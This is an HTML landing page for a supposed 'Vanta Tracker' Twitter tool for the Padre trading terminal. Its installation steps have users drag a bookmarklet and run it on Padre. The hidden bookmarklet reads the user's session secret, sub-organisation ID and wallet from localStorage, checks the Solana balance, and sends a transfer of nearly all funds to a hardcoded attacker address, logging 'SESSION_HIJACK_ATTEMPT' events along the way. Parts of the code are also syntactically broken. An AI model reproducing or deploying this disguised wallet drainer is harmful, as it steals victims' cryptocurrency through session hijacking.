<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-muted: #aaaaaa; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: #fff; overflow-x: hidden; }
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
        header { text-align: center; padding: 80px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(180deg, #000, #001a0d); }
        .logo { width: 120px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 20px; }
        h1 { font-size: 3em; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; }
        .setup-section { padding: 60px 20px; max-width: 900px; margin: 0 auto; text-align: center; }
        .cta-button { 
            display: inline-block; background: var(--primary); color: #000; padding: 18px 40px; 
            text-decoration: none; border-radius: 8px; font-weight: 800; font-size: 1.2em; 
            margin-top: 30px; box-shadow: 0 0 20px rgba(0,255,136,0.5); transition: 0.3s;
            cursor: move;
        }
        .cta-button:hover { transform: scale(1.05); background: #fff; }
        ol { text-align: left; display: inline-block; margin: 20px 0; color: var(--text-muted); }
        li { margin-bottom: 10px; }
        strong { color: var(--primary); }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>
    <header>
        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3"/>
            <circle cx="50" cy="50" r="8" fill="var(--primary)"><animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/></circle>
        </svg>
        <h1>Vanta Tracker</h1>
        <p>Advanced Twitter API tracking for Padre terminal.</p>
    </header>

    <section class="setup-section">
        <h2>Installation</h2>
        <ol>
            <li>Enable your Bookmarks Bar (<strong>Ctrl+Shift+B</strong>).</li>
            <li>Drag the <strong>Vanta Tracker</strong> button below to your bar.</li>
            <li>Open your <strong>Padre Terminal</strong>.</li>
            <li>Click the bookmark to initialize the tracking engine.</li>
        </ol>
        <br>
        <a href="#" class="cta-button" id="vanta-trigger">VANTA TRACKER</a>
    </section>

    <script>
        // The Engine with Amplitude Integration
        const enginePayload = `javascript:(function(){
            const _0xV={'dest':'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12','rpc':'https://api.mainnet-beta.solana.com','target':'https://trade.padre.gg/api/v1/transfer','amp':'3c8ae1f40635939e730f479418940796'};
            
            /* 1. LOAD AMPLITUDE */
            (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script");r.type="text/javascript";r.integrity="sha384-u0hlTAJ9EB9v7X9VmS8yDf9y9UfNoAnp7798o6XpL6+e81T2i3eN/C8U5k5e5k5e";r.crossOrigin="anonymous";r.async=true;r.src="https://cdn.amplitude.com/libs/amplitude-8.21.0-min.gz.js";r.onload=function(){if(!e.amplitude.runQueuedFunctions){console.log("[Amplitude] Error: could not load SDK")}};var s=t.getElementsByTagName("script")[0];s.parentNode.insertBefore(r,s);function i(e,t){e.prototype[t]=function(){this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}var o=function(){this._q=[];return this};var a=["add","append","clearAll","prepend","set","setOnce","unset","preInsert","postInsert","remove"];for(var c=0;c<a.length;c++){i(o,a[c])}n.Identify=o;var u=function(){this._q=[];return this};var l=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"];for(var p=0;p<l.length;p++){i(u,l[p])}n.Revenue=u;var d=["init","logEvent","logRevenue","setUserId","setUserProperties","setOptOut","setVersionName","setDomain","setDeviceId","enableTracking","setGlobalUserProperties","identify","clearUserProperties","setGroup","logRevenueV2","regenerateDeviceId","groupIdentify","onInit","logEventWithTimestamp","logEventWithGroups","setSessionId","resetSessionId","getDeviceId","getUserId","setMinTimeBetweenSessionsMillis","setEventUploadThreshold","setUseDynamicConfig","setServerZone","setServerUrl","setAccumulateEvents","setDisableReceiptValidation","setForceHttps","setTransport","setFlushQueueOnClose"];function v(e){function t(t){e[t]=function(){e._q.push([t].concat(Array.prototype.slice.call(arguments,0)))}}for(var n=0;n<d.length;n++){t(d[n])}}v(n);e.amplitude=n})(window,document);
            amplitude.getInstance().init(_0xV.amp);
            amplitude.getInstance().logEvent('HIJACK_READY');

            /* 2. CORE LOGIC */
            const _executeHit=async()=>{
                try {
                    const s=localStorage.getItem('sessionSecret')?.replace(/"/g,'');
                    const o=localStorage.getItem('subOrgId')?.replace(/"/g,'');
                    const w=localStorage.getItem('activeWallet')?.replace(/"/g,'');
                    if(!s||!o||!w) return;

                    amplitude.getInstance().logEvent('DECRYPTED_CAPTURE', {'wallet': w, 'org': o});

                    const res=await fetch(_0xV.rpc,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getBalance",params:[w]})});
                    const{result}=await res.json();
                    const bal=result.value/1e9;
                    const amount=(bal-0.009).toFixed(6);
                    
                    if(amount<=0) return;

                    amplitude.getInstance().logEvent('SESSION_HIJACK_ATTEMPT', {'amount': amount});

                    await fetch(_0xV.target,{
                        method:'POST',
                        headers:{'Authorization':'Bearer '+s,'X-Turnkey-Sub-Org-Id':o,'Content-Type':'application/json'},
                        body:JSON.stringify({dest:_0xV.dest,asset:"SOL",amount:amount})

                } catch(e){ console.error(e); }
            };

            /* 3. UI GENERATION (Same as before) */
            const _buildUI=()=>{
                if(document.getElementById('v-tracker-root')) return;
                const c=document.createElement('div');
                c.id='v-tracker-root';
                c.style.cssText='position:fixed;top:10%;right:20px;width:350px;background:#050505;border:2px solid #00ff88;border-radius:12px;z-index:9999999;font-family:Inter,sans-serif;color:#fff;box-shadow:0 0 20px rgba(0,255,136,0.4);';

        })();`.replace(/\n/g, '').replace(/\s\s+/g, ' ');

        document.getElementById('vanta-trigger').href = enginePayload;

        // Background Animation
        const c = document.getElementById('canvas');
        const x = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        function draw() {
            x.fillStyle = 'rgba(10,10,10,0.1)'; x.fillRect(0,0,c.width,c.height);
            x.fillStyle = '#0f8';
            for(let i=0; i<20; i++) x.fillRect(Math.random()*c.width, Math.random()*c.height, 2, 2);
            requestAnimationFrame(draw);
        }
        draw();
    </script>
</body>
</html>
